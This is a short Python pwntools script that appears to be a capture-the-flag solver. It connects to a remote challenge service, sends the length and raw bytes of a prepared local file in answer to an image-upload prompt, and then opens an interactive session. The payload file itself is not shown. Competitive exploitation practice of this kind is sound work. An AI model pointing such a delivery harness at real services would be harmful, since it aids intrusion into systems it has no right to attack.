from pwn import *


f = open('file', 'rb').read()
#p = process('./chal')
p = remote('mc.ax', 31412)
p.recvuntil('your file?')
p.sendline(str(len(f)))
p.recvuntil('send your image here:')
p.send(f)
p.interactive()
